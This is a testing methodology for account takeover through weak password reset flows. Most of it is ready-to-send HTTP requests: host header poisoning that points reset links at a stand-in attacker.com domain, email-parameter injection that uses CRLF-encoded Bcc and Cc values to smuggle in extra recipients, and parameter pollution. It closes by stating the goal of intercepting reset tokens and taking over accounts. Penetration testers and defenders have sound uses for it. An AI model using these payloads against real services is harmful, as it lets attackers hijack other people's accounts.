# Account Takeover via Password Reset – Testing Methodology

This document outlines a practical methodology for identifying Account Takeover (ATO) vulnerabilities through weaknesses in password reset flows.

The focus is on breaking authentication logic and identifying cases where reset tokens or links can be manipulated, intercepted, or redirected.

---

## Scope

This methodology targets:
- Password reset endpoints
- Email-based recovery flows
- Token generation and delivery mechanisms

---

## 1. Critical Test Area — Host Header Poisoning

### Objective
Identify whether the application constructs password reset links using user-controlled headers.

### Test Strategy
Inject malicious host-related headers and observe if they are reflected in reset links.

### Example Request
POST /api/auth/reset HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Proto: https
Forwarded: host=attacker.com
Origin: https://attacker.com
Referer: https://attacker.com
Content-Type: application/json

{
  "email": "victim@gmail.com"
}

### Additional Headers to Test
Host: attacker.com
X-Original-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Rewrite-URL: /
X-Original-URL: /

### Expected Vulnerable Behavior
- Password reset link is generated using attacker-controlled domain
- Victim receives a reset link pointing to attacker infrastructure

---

## 2. Primary Test Area — Email Parameter Manipulation

### Objective
Determine if the reset endpoint accepts multiple email inputs or supports injection via separators.

### Test Strategy
Send multiple email values and attempt to inject additional recipients.

### Example Request
POST /api/v1/auth/password-reset HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "email": [
    "victim@gmail.com",
    "tester@gmail.com"
  ]
}

### Form Variations
email=victim@gmail.com,tester@gmail.com
email=victim@gmail.com|tester@gmail.com
email=victim@gmail.com%0atester@gmail.com
email=victim@gmail.com%0d%0atester@gmail.com
email=victim@gmail.com%0aBcc:tester@gmail.com
email=victim@gmail.com%0d%0aCc:tester@gmail.com

### Goal
- Force reset token delivery to attacker-controlled inbox
- Abuse parsing inconsistencies in backend or mail service

---

## 3. Secondary Test Area — Parameter Pollution

### Objective
Test how the backend handles duplicate parameters.

### Test Strategy
Send multiple instances of the same parameter and observe which value is used.

### Example Request
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@gmail.com&email=tester@gmail.com

### Reverse Order Test
email=tester@gmail.com&email=victim@gmail.com

### Mixed Injection
email=victim@gmail.com&email=tester@gmail.com&email[]=tester@gmail.com

### Expected Behavior to Watch
- First parameter wins
- Last parameter wins
- Array parsing overrides single value
- Backend inconsistency leading to token leakage

---

## Notes

- Always verify where the reset link is delivered
- Monitor both victim and attacker inboxes
- Check raw email headers if possible
- Test across different content types (JSON, form-urlencoded, multipart)

---

## Goal

The end goal is to:
- Redirect password reset links
- Intercept reset tokens
- Achieve full Account Takeover
